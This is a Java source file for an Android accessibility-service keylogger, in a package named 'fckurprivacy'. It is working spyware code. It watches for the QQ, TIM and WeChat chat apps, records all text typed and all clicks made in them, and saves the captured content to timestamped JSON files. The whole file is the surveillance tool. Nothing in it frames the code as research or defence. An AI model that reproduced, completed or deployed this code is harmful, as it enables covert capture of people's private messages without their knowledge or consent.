package com.vergermiya.harevost.fckurprivacy.KeyLogger;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;

import org.json.JSONStringer;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

/**
 * Created by harevost on 18-7-18.
 */

public class KeyLogger extends AccessibilityService{

    private static String APP_QQ = "com.tencent.qq";
    private static String APP_TIM = "com.tencent.tim";
    private static String APP_MM = "com.tencent.mm";

    private static CharSequence lastPackage = "";
    private static CharSequence targetPackage = "";
    private static SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);

    private static String logData = "";
    private static int textDataLen = 0;
    private static boolean isBuiltJson = false;

    @Override
    public void onServiceConnected() {
        Log.d("KeyLogger", "Service Started");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        int eventType = event.getEventType();
        CharSequence currentPackage = "";

        Date date = new Date(System.currentTimeMillis());
        String nowDate = dateFormat.format(date);

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && !event.getPackageName().equals("")) {
                currentPackage = event.getPackageName();
                Log.d("KeyLogger.currentPkg", currentPackage.toString());
            }
            if (!currentPackage.equals("")) {
                lastPackage = currentPackage;
                Log.d("KeyLogger.lastPkg", lastPackage.toString());
            }
        }

        if (lastPackage.equals(APP_QQ) || lastPackage.equals(APP_MM) || lastPackage.equals(APP_TIM)) {
            isBuiltJson = false;
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    String textData = event.getText().toString();
                    int dataLen = textData.length();
                    Log.d("KeyLogger", "TEXT:" + textData);
                    if (dataLen >= textDataLen) {
                        textDataLen = dataLen;
                    }
                    logData += textData.replace("[", "|t_").replace("]", "_t|");
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                    String clickedData = event.getText().toString();
                    Log.d("KeyLogger", "CLICKED:" + clickedData);
                    logData += clickedData.replace("[", "|c_").replace("]", "_c|");
                    textDataLen = 0;
                    break;
                }
            }
            targetPackage = lastPackage;
        } else {
            if (!isBuiltJson) {
                JSONStringer keyLogJsonStr = JsonBuilder.buildKeyLogJson(new KeyLogJson(nowDate, targetPackage.toString(), logData));
                String fileName = targetPackage.toString() + "_" + nowDate + "_" + "KeyLog";
                Log.d("KeyLogger", keyLogJsonStr.toString());
                isBuiltJson = true;
                FileSaver fileSaver = new FileSaver();
                fileSaver.saveFile(fileName, ".json", keyLogJsonStr.toString());
            }
            targetPackage = "";
            textDataLen = 0;
        }
    }

    @Override
    public void onInterrupt() {

    }
}
